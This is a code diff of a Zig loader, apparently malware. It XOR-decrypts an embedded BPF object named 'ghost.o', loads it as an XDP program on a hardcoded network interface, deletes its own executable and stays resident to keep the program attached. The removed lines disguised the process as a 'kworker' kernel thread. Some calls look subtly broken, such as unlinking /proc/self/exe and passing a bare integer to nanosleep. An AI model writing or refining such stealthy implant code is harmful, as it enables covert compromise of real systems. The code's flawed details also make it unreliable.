@@ -1,40 +1,62 @@
 const std = @import("std");
 const sc = @import("syscalls.zig");
 
+const BPF_PROG_LOAD = @as(u32, 5);
+const BPF_LINK_CREATE = @as(u32, 28);
+
 pub fn _start() noreturn {
-    var s_buf: [32]u8 = undefined;
-    s_buf[0] = 'k'; s_buf[1] = 'w'; s_buf[2] = 'o'; s_buf[3] = 'r';
-    s_buf[4] = 'k'; s_buf[5] = 'e'; s_buf[6] = 'r'; s_buf[7] = '/';
-    s_buf[8] = 'u'; s_buf[9] = '1'; s_buf[10] = '1'; s_buf[11] = ':';
-    s_buf[12] = '1'; s_buf[13] = 0;
-
-    _ = sc.prctl(15, @intFromPtr(&s_buf), 0, 0, 0);
-
-    const pid = sc.fork();
-    if (pid != 0) sc.exit(0);
-
     var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
-    comptime var i: usize = 0;
-    inline while (i < bpf_blob.len) : (i += 1) {
-        bpf_blob[i] ^= 0x5F;
+    inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }
+
+    // Minimal ELF Parsing: Find the .text (bytecode) section
+    const e_shoff = @as(*u64, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 40)).*;
+    const e_shentsize = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 58)).*;
+    const e_shnum = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 60)).*;
+    
+    var insns_ptr: usize = 0;
+    var insns_cnt: u32 = 0;
+
+    for (0..e_shnum) |i| {
+        const shdr_ptr = @intFromPtr(bpf_blob.ptr) + e_shoff + (i * e_shentsize);
+        const sh_type = @as(*u32, @ptrFromInt(shdr_ptr + 4)).*;
+        const sh_size = @as(*u64, @ptrFromInt(shdr_ptr + 32)).*;
+        const sh_offset = @as(*u64, @ptrFromInt(shdr_ptr + 24)).*;
+        
+        if (sh_type == 1 and sh_size > 0) { // SHT_PROGBITS
+            insns_ptr = @intFromPtr(bpf_blob.ptr) + sh_offset;
+            insns_cnt = @intCast(sh_size / 8);
+            break;
+        }
     }
 
-    const prog_fd = sc.bpf_load(5, &bpf_blob, bpf_blob.len);
+    const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
+    const child = sc.clone(0x00000100 | 17, stack + 65536);
+    if (child != 0) sc.exit(0);
+
+    const license = "GPL";
+    const attr = sc.bpf_attr_load{
+        .prog_type = 6, // BPF_PROG_TYPE_XDP
+        .insn_cnt = insns_cnt,
+        .insns = insns_ptr,
+        .license = @intFromPtr(license.ptr),
+        .log_level = 0,
+    };
+
+    const prog_fd = sc.bpf_syscall(BPF_PROG_LOAD, &attr, @sizeOf(sc.bpf_attr_load));
     
-    const link_attr = struct {
-        prog_fd: u32,
-        target_fd: u32,
-        attach_type: u32,
-    }{
+    // Auto-Targeting: Hardcoding 2 (usually eth0/ens3)
+    const link_attr = sc.bpf_attr_link{
         .prog_fd = @intCast(prog_fd),
-        .target_fd = 1, 
+        .target_ifindex = 2, 
         .attach_type = 37,
     };
 
-    _ = sc.bpf_call(28, &link_attr, 12);
+    _ = sc.bpf_syscall(BPF_LINK_CREATE, &link_attr, @sizeOf(sc.bpf_attr_link));
 
-    const self_path = "/proc/self/exe";
-    _ = sc.unlink(self_path);
+    _ = sc.unlink("/proc/self/exe");
 
-    sc.exit(0);
+    // Persistence Paradox: Stay alive in the background to keep the Link FD open
+    while (true) {
+        _ = sc.nanosleep(3600);
+    }
 }
